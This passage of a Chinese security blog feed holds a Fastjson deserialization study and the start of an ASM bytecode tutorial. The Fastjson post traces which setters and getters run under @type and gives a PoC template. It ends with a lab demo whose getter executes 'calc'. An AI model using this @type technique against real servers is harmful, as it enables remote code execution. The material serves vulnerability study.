<h1 id="parse与parseObject区别"><a href="#parse与parseObject区别" class="headerlink" title="parse与parseObject区别"></a>parse与parseObject区别</h1><p>前面的demo都是用parseObject()演示的，还没说到parse()。两者主要的区别就是parseObject()返回的是JSONObject而parse()返回的是实际类型的对象.</p>
<p>当在没有对应类的定义的情况下，一般情况下都会使用JSON.parseObject()来获取数据。</p>
<blockquote>
<p>FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。</p>
</blockquote>
<p>这里最好看一下源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        Object obj = parse(text);</span><br><span class="line">        <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>parseObject({..})其实就是parse({..})的一个封装，对于parse的结果进行一次结果判定然后转化为JSONObject类型。</p>
<p>也就是说，我们用parse()反序列化会直接得到特定的类，而无需像parseObject()一样返回的是JSONObject类型的对象、还可能需要去设置第二个参数指定返回特定的类。</p>
<p>结论：</p>
<ul>
<li>parse(“”) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li>
<li>parseObject(“”) 会调用反序列化目标类的特定 setter 和 getter 方法（此处有的博客说是所有setter，个人测试返回String的setter是不行的，此处打个问号）</li>
<li>parseObject(“”,class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li>
</ul>
<p>修改上一步中的parseObject()为parse()：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj = JSON.parse(jsonstring);</span><br><span class="line"><span class="comment">//或以下语句，输出结果一致</span></span><br><span class="line"><span class="comment">//Object obj = JSON.parse(jsonstring, Feature.SupportNonPublicField);</span></span><br><span class="line">System.out.println(obj);</span><br><span class="line">System.out.println(obj.getClass().getName());</span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">getProperties</span><br><span class="line">fastjson2change.Student@<span class="number">6659</span>c656</span><br><span class="line">fastjson2change.Student</span><br></pre></td></tr></table></figure>

<p>可以看到，这里我直接用的parse，没有用parseObject，也没有指定目标类，并且加不加那个冗余的参数结果都是一样，结果都是成功地反序列化为Student类对象。</p>
<p>这里我再举一个例子，先建立一个序列化实验用的Person类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String full_name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Boolean sex;</span><br><span class="line">    <span class="keyword">private</span> Properties prop;</span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//set</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setAge()"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//get 返回Boolean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">getSex</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getSex()"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//get 返回ProPerties</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getProp()"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.prop;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//在输出时会自动调用的对象ToString函数</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String s = <span class="string">"[Person Object] name="</span> + <span class="keyword">this</span>.name + <span class="string">" full_name="</span> + <span class="keyword">this</span>.full_name  + <span class="string">", age="</span> + <span class="keyword">this</span>.age + <span class="string">", prop="</span> + <span class="keyword">this</span>.prop + <span class="string">", sex="</span> + <span class="keyword">this</span>.sex;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再写一个反序列化类来调用他：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">type</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String eneity3 = <span class="string">"&#123;\"被屏蔽的type\":\"fastjson2change.Person\", \"name\":\"lala\", \"full_name\":\"lalalolo\", \"age\": 13, \"prop\": &#123;\"123\":123&#125;, \"sex\": 1&#125;"</span>;</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object obj = JSON.parseObject(eneity3,Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">//输出会调用obj对象的tooString函数</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person构造函数</span><br><span class="line">setAge()</span><br><span class="line">getProp()</span><br><span class="line">[Person Object] name=lala full_name=<span class="keyword">null</span>, age=<span class="number">13</span>, prop=<span class="keyword">null</span>, sex=<span class="keyword">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> name 反序列化成功</span><br><span class="line"><span class="keyword">private</span> full_name 反序列化失败</span><br><span class="line"><span class="keyword">private</span> age setAge函数被调用</span><br><span class="line"><span class="keyword">private</span> sex getsex函数没有被调用</span><br><span class="line"><span class="keyword">private</span> prop getprop函数被成功调用</span><br></pre></td></tr></table></figure>

<p>可以得知：</p>
<ul>
<li>public修饰符的属性会进行反序列化赋值，private修饰符的属性不会直接进行反序列化赋值，而是会调用setxxx(xxx为属性名)的函数进行赋值。</li>
<li>getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用</li>
</ul>
<p>这里调试一下，跟进去看看，可以看到下图位置处针对我们的@type进行定向解析：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624114114569.png" alt="image-20200624114114569"></p>
<p>决定这个set/get函数是否将被调用的代码最终在<code>com.alibaba.fastjson.util.JavaBeanInfo#build</code>函数处</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624120125884.png" alt="image-20200624120125884"></p>
<p>继续跟，继续跟。。。</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624120447372.png" alt="image-20200624120447372"></p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624121013685.png" alt="image-20200624121013685"></p>
<p>接下来是一堆判断条件：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624121144284.png" alt="image-20200624121144284"></p>
<p>在进入build函数后会遍历一遍传入class的所有方法，去寻找满足set开头的特定类型方法；再遍历一遍所有方法去寻找get开头的特定类型的方法。</p>
<p><strong>set开头的方法要求如下：</strong></p>
<ul>
<li>方法名长度大于4且以set开头，且第四个字母要是大写</li>
<li>非静态方法</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<p>寻找到符合要求的set开头的方法后会根据一定规则提取方法名后的变量名（好像会过滤_，就是set_name这样的方法名中的下划线会被略过，得到name）。再去跟这个类的属性去比对有没有这个名称的属性。</p>
<p>如果没有这个属性并且这个set方法的输入是一个布尔型（是boolean类型，不是Boolean类型，这两个是不一样的），会重新给属性名前面加上<strong>is</strong>，再取头两个字符，第一个字符为大写（即isNa），去寻找这个属性名。</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624121614209.png" alt="image-20200624121614209"></p>
<p>这里的is就是有的网上有的文章中说反序列化会自动调用get、set、is方法的由来。个人觉得这种说法应该是错误的。</p>
<p>真实情况应该是确认存在符合setXxx方法后，会与这个方法绑定一个xxx属性，如果xxx属性不存在则会绑定isXx属性（这里is后第一个字符需要大写，才会被绑定）。并没有调用is开头的方法</p>
<p>自己从源码中分析或者尝试在类中添加isXx方法都是不会被调用的，这里只是为了指出其他文章中的一个错误。这个与调用的set方法绑定的属性，再之后并没有发现对于调用过程有什么影响。</p>
<p><strong>所以只要目标类中有满足条件的set方法，然后得到的方法变量名存在于序列化字符串中，这个set方法就可以被调用。</strong></p>
<p><strong>get开头的方法要求如下：</strong></p>
<ul>
<li>方法名长度大于等于4</li>
<li>非静态方法</li>
<li>以get开头且第4个字母为大写</li>
<li>无传入参数</li>
<li>返回值类型继承自Collection/Map/AtomicBoolean/AtomicInteger AtomicLong</li>
</ul>
<p>所以我们上面例子中的getsex方法没有被调用是因为返回类型不符合，而getprop方法被成功调用是因为Properties 继承 Hashtable，而Hashtable实现了Map接口，返回类型符合条件。</p>
<p>再顺便看一下最后触发方法调用的地方com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue，（在被调用的方法中下断点即可）</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624122556545.png" alt="image-20200624122556545"></p>
<p>那么至此我们可以知道</p>
<ul>
<li>@type可以指定反序列化成服务器上的任意类</li>
<li>然后服务端会解析这个类，提取出这个类中符合要求的setter方法与getter方法（如setxxx）</li>
<li>如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的setter、getter方法（即setxxx方法、getxxx方法）</li>
</ul>
<p>看上去应该是挺正常的使用逻辑，反序列化需要调用对应参数的setter、getter方法来恢复数据。</p>
<p>但是在可以调用任意类的情况下，如果setter、getter方法中存在可以利用的情况，就会导致任意命令执行。</p>
<p>对应反序列化攻击利用三要素来说，以上我们就是找到了readObject复写点，下面来探讨反序列化利用链。</p>
<h1 id="Fastjson反序列化漏洞原理"><a href="#Fastjson反序列化漏洞原理" class="headerlink" title="Fastjson反序列化漏洞原理"></a>Fastjson反序列化漏洞原理</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>由前面知道，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。</p>
<p>通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。</p>
<p><strong>那么如何才能够反序列化出恶意类呢？</strong></p>
<p>由前面demo知道，Fastjson使用parseObject()/parse()进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写<code>Object o = JSON.parseObject(poc,Object.class)</code>就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。</p>
<p><strong>接着，如何才能触发反序列化得到的恶意类中的恶意函数呢？</strong></p>
<p>由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发。</p>
<p>到DefaultJSONParser.parseObject(Map object, Object fieldName)中看下，JSON中以@type形式传入的类的时候，调用deserializer.deserialize()处理该类，并去调用这个类的setter和getter方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings</span>(&#123; <span class="string">"unchecked"</span>, <span class="string">"rawtypes"</span> &#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// JSON.DEFAULT_TYPE_KEY即@type</span></span><br><span class="line">    <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">		...</span><br><span class="line">        ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line">        <span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>

<p><strong>小结一下</strong></p>
<p>若反序列化指定类型的类如<code>Student obj = JSON.parseObject(text, Student.class);</code>，该类本身的构造函数、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p>
<p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(text, Object.class);</code>，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p>
<h2 id="PoC写法"><a href="#PoC写法" class="headerlink" title="PoC写法"></a>PoC写法</h2><p>一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">"@type"</span>:<span class="string">"xxx.xxx.xxx"</span>,</span><br><span class="line"><span class="string">"xxx"</span>:<span class="string">"xxx"</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件：</p>
<ol>
<li>该类的构造函数、setter方法、getter方法中的某一个存在危险操作，比如造成命令执行；</li>
<li>可以控制该漏洞函数的变量（一般就是该类的属性）；</li>
</ol>
<h2 id="漏洞demo"><a href="#漏洞demo" class="headerlink" title="漏洞demo"></a>漏洞demo</h2><p>由前面比较的案例知道，当反序列化指定的类型是Object.class，即代码为<code>Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</code>时，反序列化得到的类的构造函数、所有属性的setter方法、properties私有属性的getter方法都会被调用，因此我们这里直接做最简单的修改，将Student类中会被调用的getter方法添加漏洞代码，这里修改getProperties()作为演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StudentDemo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAddress"</span>);</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getProperties"</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>触发代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String jsonstring =<span class="string">"&#123;\"@type\":\"fastjson2change.StudentDemo\",\"age\":18,\"name\":\"0range\",\"address\":\"China\",\"properties\":&#123;&#125;&#125;"</span>;</span><br><span class="line">        Object obj = JSON.parseObject(jsonstring, Object<span class="class">.<span class="keyword">class</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br></pre></td></tr></table></figure>

<p>结果成功触发：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624163813380.png" alt="image-20200624163813380"></p>
<p>很明显，前面的Demo中反序列化的类是一个Object类，该类是任意类的父类，其子类Student存在Fastjson反序列化漏洞，当@type指向Student类是反序列化就会触发漏洞。</p>
<p>对于另一种反序列化指定类的情景，是该指定类本身就存在漏洞，比如我们将上述Demo中反序列化那行代码改成直接反序列化得到Student类而非Object类，这样就是另一个触发也是最直接的触发场景：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">StudentDemo obj = JSON.parseObject(jsonstring, StudentDemo<span class="class">.<span class="keyword">class</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>触发场景；</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200624164056028.png" alt="image-20200624164056028"></p>
<p>这一篇先写到这里，下一篇讲讲Fastjson的漏洞时间线。</p>
<p><a href="https://www.mi1k7ea.com/" target="_blank" rel="noopener">参考博客</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>ASM笔记</title>
    <url>/ASM%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>累土而不辍，丘山崇成。</p>
</blockquote>
<p>今天来学习磨人的ASM框架。</p>
<a id="more"></a>

<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 是一个 Java 字节码操控框架。它能被用来动态生成类或者增强既有类的功能。ASM 可以直接产生二进制 class 文件，也可以在类被加载入 Java 虚拟机之前动态改变类行为。Java class 被存储在严格格式定义的 .class 文件里，这些类文件拥有足够的元数据来解析类中的所有元素：类名称、方法、属性以及 Java 字节码（指令）。ASM 从类文件中读入信息后，能够<u>改变</u>类行为，<u>分析</u>类信息，甚至能够根据用户要求生成新类。</p>
<p>简单的说，ASM可以读取解析<code>class</code>文件内容，并提供接口让你可以对<code>class</code>文件字节码内容进行CRUD操作。</p>
<p><strong>注:</strong> <code>class</code>文件存储的是<code>java</code>字节码，ASM 是对<code>java</code>字节码操作的一层封装，因此，如果你很了解 <code>class</code>文件格式的话，你甚至可以通过直接使用文本编辑器（eg:Vim）来改写<code>class</code>文件。</p>
<p>知道了 ASM 的作用后，接下来就来看下 ASM 的执行模式。</p>
<h1 id="ASM框架执行流程"><a href="#ASM框架执行流程" class="headerlink" title="ASM框架执行流程"></a>ASM框架执行流程</h1><p><a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 提供了两组API：Core和Tree：</p>
<ul>
<li>Core是基于访问者模式来操作类的</li>
<li>Tree是基于树节点来操作类的</li>
</ul>
<p><strong>本文我们主要讨论的是 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 的 CoreAPI。</strong></p>
<p><a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 内部采用 <strong>访问者模式</strong> 将 <code>.class</code> 类文件的内容从头到尾扫描一遍，每次扫描到类文件相应的内容时，都会调用<code>ClassVisitor</code>内部相应的方法。<br> 比如：</p>
<ul>
<li>扫描到<strong>类文件</strong>时，会回调<code>ClassVisitor</code>的<code>visit()</code>方法；</li>
<li>扫描到<strong>类注解</strong>时，会回调<code>ClassVisitor</code>的<code>visitAnnotation()</code>方法；</li>
<li>扫描到<strong>类成员</strong>时，会回调<code>ClassVisitor</code>的<code>visitField()</code>方法；</li>
<li>扫描到<strong>类方法</strong>时，会回调<code>ClassVisitor</code>的<code>visitMethod()</code>方法；<br> ······<br> 扫描到相应结构内容时，会回调相应方法，该方法会返回一个对应的字节码操作对象（比如，<code>visitMethod()</code>返回<code>MethodVisitor</code>实例），通过修改这个对象，就可以修改<code>class</code>文件相应结构部分内容，最后将这个<code>ClassVisitor</code>字节码内容覆盖原来<code>.class</code>文件就实现了类文件的代码切入。</li>
</ul>
<p>具体关系如下：</p>
<table>
<thead>
<tr>
<th align="center">树形关系</th>
<th align="center">使用的接口</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Class</td>
<td align="center">ClassVisitor</td>
</tr>
<tr>
<td align="center">Field</td>
<td align="center">FieldVisitor</td>
</tr>
<tr>
<td align="center">Method</td>
<td align="center">MethodVisitor</td>
</tr>
<tr>
<td align="center">Annotation</td>
<td align="center">AnnotationVisitor</td>
</tr>
</tbody></table>
<p>整个具体的执行时序如下图所示：</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509145250530.png" alt="image-20200509145250530"></p>
<p>通过时序图可以看出<a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a>在处理<code>class</code>文件的整个过程。<a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a>通过树这种数据结构来表示复杂的字节码结构，并利用 <strong>Push模型</strong> 来对树进行遍历。</p>
<ul>
<li><p><a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 中提供一个<code>ClassReader</code>类，这个类可以直接由字节数组或者<code>class</code>文件间接的获得字节码数据。它会调用<code>accept()</code>方法，接受一个实现了抽象类<code>ClassVisitor</code>的对象实例作为参数，然后依次调用<code>ClassVisitor</code>的各个方法。字节码空间上的偏移被转成各种<code>visitXXX</code>方法。使用者只需要在对应的的方法上进行需求操作即可，无需考虑字节偏移。</p>
</li>
<li><p>这个过程中<code>ClassReader</code>可以看作是一个事件生产者，<code>ClassWriter</code>继承自<code>ClassVisitor</code>抽象类，负责将对象化的class文件内容重构成一个二进制格式的<code>class</code>字节码文件，<code>ClassWriter</code>可以看作是一个事件的消费者。</p>
</li>
<li><p>通常，<code>cr.accept(cvv, skip_Debug)</code>.</p>
<p>cvv通常是来继承<code>ClassVistor</code>的一个类的实例，这个类里面通常重载<code>ClassVisitor</code>的一系列方法，实现我们自己的操作。</p>
</li>
</ul>
<p>接下来还剩的一点内容就是如何实现<code>class</code>文件字节码的修改。</p>
<h1 id="ASM字节码修改"><a href="#ASM字节码修改" class="headerlink" title="ASM字节码修改"></a>ASM字节码修改</h1><p>由于 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 是直接对<code>class</code>文件的字节码进行操作，因此，要修改<code>class</code>文件内容时，也要注入相应的<code>java</code>字节码。</p>
<p>所以，在注入字节码之前，我们还需要了解下<code>class</code>文件的结构，JVM指令等知识。</p>
<h2 id="Class文件结构"><a href="#Class文件结构" class="headerlink" title="Class文件结构"></a>Class文件结构</h2><p> <code>Java</code>源文件经过<code>javac</code>编译器编译之后，将会生成对应的二进制<code>.class</code>文件，如下图所示：</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509153518513.png" alt="image-20200509153518513"></p>
<p><code>Java</code>类文件是 8 位字节的二进制流。数据项按顺序存储在<code>class</code>文件中，相邻的项之间没有间隔，这使得<code>class</code>文件变得紧凑，减少存储空间。在<code>Java</code>类文件中包含了许多大小不同的项，由于每一项的结构都有严格规定，这使得 class 文件能够从头到尾被顺利地解析。</p>
<p>每个<code>class</code>文件都是有固定的结构信息，而且保留了源码文件中的符号。下图是<code>class</code>文件的格式图。其中带 * 号的表示可重复的结构。</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509153606292.png" alt="image-20200509153606292"></p>
<p>类结构体中所有的修饰符、字符常量和其他常量都被存储在class文件开始的一个常量堆栈(Constant Stack)中，其他结构体通过索引引用。</p>
<p>每个类必须包含headers（包括：class name, super class, interface, etc.）和常量堆栈（Constant Stack）其他元素，例如：字段（fields）、方法（methods）和全部属性（attributes）可以选择显示或者不显示。</p>
<p>每个字段块（Field section）包括名称、修饰符（public, private, etc.）、描述符号(descriptor)和字段属性。</p>
<p>每个方法区域（Method section）里面的信息与header部分的信息类似，信息关于最大堆栈（max stack）和最大本地变量数量（max local variable numbers）被用于修改字节码。对于非abstract和非native的方法有一个方法指令表，exceptions表和代码属性表。除此之外，还可以有其他方法属性。</p>
<p>每个类、字段、方法和方法代码的属性有属于自己的名称记录在类文件格式的JVM规范的部分，这些属性展示了字节码多方面的信息，例如源文件名、内部类、签名、代码行数、本地变量表和注释。JVM规范允许定义自定义属性，这些属性会被标准的VM（虚拟机）忽略，但是可以包含附件信息。</p>
<p>方法代码表包含一系列对java虚拟机的指令。有些指令在代码中使用偏移量，当指令从方法代码被插入或者移除时，全部偏移量的值可能需要调整。</p>
<h2 id="Java类型与Class文件内部类型对应关系"><a href="#Java类型与Class文件内部类型对应关系" class="headerlink" title="Java类型与Class文件内部类型对应关系"></a>Java类型与Class文件内部类型对应关系</h2><p><code>Java</code>类型分为基本类型和引用类型，在 JVM 中对每一种类型都有与之相对应的类型描述，如下表：</p>
<table>
<thead>
<tr>
<th align="center">Java type</th>
<th align="center">JVM Type descriptor</th>
</tr>
</thead>
<tbody><tr>
<td align="center">boolean</td>
<td align="center">Z</td>
</tr>
<tr>
<td align="center">char</td>
<td align="center">C</td>
</tr>
<tr>
<td align="center">byte</td>
<td align="center">B</td>
</tr>
<tr>
<td align="center">short</td>
<td align="center">S</td>
</tr>
<tr>
<td align="center">int</td>
<td align="center">I</td>
</tr>
<tr>
<td align="center">float</td>
<td align="center">F</td>
</tr>
<tr>
<td align="center">long</td>
<td align="center">J</td>
</tr>
<tr>
<td align="center">double</td>
<td align="center">D</td>
</tr>
<tr>
<td align="center">Object</td>
<td align="center">Ljava/lang/Object;</td>
</tr>
<tr>
<td align="center">int[]</td>
<td align="center">[I</td>
</tr>
<tr>
<td align="center">Object[][]</td>
<td align="center">[[Ljava/lang/Object;</td>
</tr>
</tbody></table>
<p>在 <a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a> 中要获得一个类的 JVM 内部描述，可以使用<code>org.objectweb.asm.Type</code>类中的<code>getDescriptor(final Class c)</code>方法，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TypeDescriptors</span> </span>&#123;    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;    </span><br><span class="line">   System.out.println(Type.getDescriptor(TypeDescriptors<span class="class">.<span class="keyword">class</span>))</span>;    </span><br><span class="line">     System.out.println(Type.getDescriptor(String<span class="class">.<span class="keyword">class</span>))</span>;    </span><br><span class="line">    &#125;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Lorg/victorzhzh/core/structure/TypeDescriptors;    </span><br><span class="line">Ljava/lang/String;</span><br></pre></td></tr></table></figure>

<h2 id="Java方法声明与Class内部声明的对应关系"><a href="#Java方法声明与Class内部声明的对应关系" class="headerlink" title="Java方法声明与Class内部声明的对应关系"></a>Java方法声明与Class内部声明的对应关系</h2><p>在·Java·的二进制文件中，方法的方法名和方法的描述都是存储在Constant pool 中的，且在两个不同的单元里。因此，方法描述中不含有方法名，只含有参数类型和返回类型。</p>
<p>格式：(参数描述符)返回值描述符</p>
<table>
<thead>
<tr>
